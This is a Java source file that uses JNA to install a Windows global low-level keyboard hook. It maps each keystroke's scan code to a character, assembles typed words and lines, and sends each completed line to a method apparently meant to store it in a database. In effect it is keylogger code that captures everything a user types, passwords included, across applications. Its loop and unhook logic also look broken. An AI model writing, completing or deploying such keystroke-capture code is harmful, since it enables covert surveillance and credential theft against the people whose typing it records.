/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package keybord;

import Comman.KeysVer;
import Comman.Tool;
import com.sun.jna.platform.win32.Kernel32;
import com.sun.jna.platform.win32.User32;
import com.sun.jna.platform.win32.WinDef.HMODULE;
import com.sun.jna.platform.win32.WinDef.LRESULT;
import com.sun.jna.platform.win32.WinDef.WPARAM;

/**
 *
 * @author Abaza
 */
public class thrkeybord {

    private static final Comman.Tool Tool = new Tool();
    private final KeysVer Key = new KeysVer();
    private User32.HHOOK hook;
    boolean KeyBord = false;
    static int ii = 0;
    static String Word = "";
    static String FullLine = "";

    public void init() {
        KeyBord = true;
        this.run();
    }

    private void Formating(int In) {

        switch (In) {
            case 57: //Space
                FullLine += Word + " ";
                Word = "";
                break;
            case 28: //Enter
                if (Word.length() > 0) {
                    FullLine += Word + ".";
                }
                WriteToDatabase(FullLine);
                FullLine = "";
                Word = "";
                break;
//            case 58: //Caps Lock
//                break;
//            case 42: //Shift
//                break;
            case 14: //Back space
                if (Word.length() > 0) {
                    Word = Word.substring(0, Word.length() - 1);
                } else {
                    if (FullLine.length() > 0) {
                        FullLine = FullLine.substring(0, FullLine.length() - 1);
                    }
                }
                break;
//            case 29://ctrl
//                break;
//            case 56://alt
//                break;
//            case 83://delete
//                break;
            case 41:
                Word += "`";
                break;
            case 2:
                Word += "1";
                break;
            case 3:
                Word += "2";
                break;
            case 4:
                Word += "3";
                break;
            case 5:
                Word += "4";
                break;
            case 6:
                Word += "5";
                break;
            case 7:
                Word += "6";
                break;
            case 8:
                Word += "7";
                break;
            case 9:
                Word += "8";
                break;
            case 10:
                Word += "9";
                break;
            case 11:
                Word += "0";
                break;
            case 12:
                Word += "-";
                break;
            case 13:
                Word += "=";
                break;
            case 15:
                Word += "   ";
                break;
            case 16:
                Word += "q";
                break;
            case 17:
                Word += "w";
                break;
            case 18:
                Word += "e";
                break;
            case 19:
                Word += "r";
                break;
            case 20:
                Word += "t";
                break;
            case 21:
                Word += "y";
                break;
            case 22:
                Word += "u";
                break;
            case 23:
                Word += "i";
                break;
            case 24:
                Word += "o";
                break;
            case 25:
                Word += "p";
                break;
            case 26:
                Word += "[";
                break;
            case 27:
                Word += "]";
                break;
            case 43:
                Word += "\\";
                break;
            case 30:
                Word += "a";
                break;
            case 31:
                Word += "s";
                break;
            case 32:
                Word += "d";
                break;
            case 33:
                Word += "f";
                break;
            case 34:
                Word += "g";
                break;
            case 35:
                Word += "h";
                break;
            case 36:
                Word += "j";
                break;
            case 37:
                Word += "k";
                break;
            case 38:
                Word += "l";
                break;
            case 39:
                Word += ";";
                break;
            case 40:
                Word += "'";
                break;
            case 44:
                Word += "z";
                break;
            case 45:
                Word += "x";
                break;
            case 46:
                Word += "c";
                break;
            case 47:
                Word += "v";
                break;
            case 48:
                Word += "b";
                break;
            case 49:
                Word += "n";
                break;
            case 50:
                Word += "m";
                break;
            case 51:
                Word += ",";
                break;
            case 83:
            case 52:
                Word += ".";
                break;
            case 82:
                Word += "0";
                break;
            case 79:
                Word += "1";
                break;
            case 80:
                Word += "2";
                break;
            case 81:
                Word += "3";
                break;
            case 75:
                Word += "4";
                break;
            case 76:
                Word += "5";
                break;
            case 77:
                Word += "6";
                break;
            case 71:
                Word += "7";
                break;
            case 72:
                Word += "8";
                break;
            case 73:
                Word += "9";
                break;
            case 78:
                Word += "+";
                break;
            case 74:
                Word += "-";
                break;
            case 55:
                Word += "*";
                break;
            case 53:
                Word += "/";
                break;
        }

    }

    private void WriteToDatabase(String Word) {
        System.out.println(Word);
    }

    public void run() {
        System.out.println("Hook Keybord");
        User32.LowLevelKeyboardProc lpfn = new User32.LowLevelKeyboardProc() {
            @Override
            public LRESULT callback(int nCode, WPARAM wParam, User32.KBDLLHOOKSTRUCT lParam) {
                if (ii == 0) {
                    Formating(lParam.scanCode);
                    ii++;
                } else {
                    ii = 0;
                }
                return User32.INSTANCE.CallNextHookEx(hook, nCode, wParam, lParam.getPointer());
            }
        };

        HMODULE module = Kernel32.INSTANCE.GetModuleHandle(null);
        hook = User32.INSTANCE.SetWindowsHookEx(User32.WH_KEYBOARD_LL, lpfn, module, 0);

        if (hook == null) {
            return;
        }

        while (!KeyBord) {
            User32.MSG msg = new User32.MSG();
            int result = User32.INSTANCE.GetMessage(msg, null, 0x100, 0x109);
            if (result != -1) {
                User32.INSTANCE.TranslateMessage(msg);
                User32.INSTANCE.DispatchMessage(msg);
            }
            User32.INSTANCE.UnhookWindowsHookEx(hook);
        }
    }

    public void end() {
        KeyBord = false;
    }
}
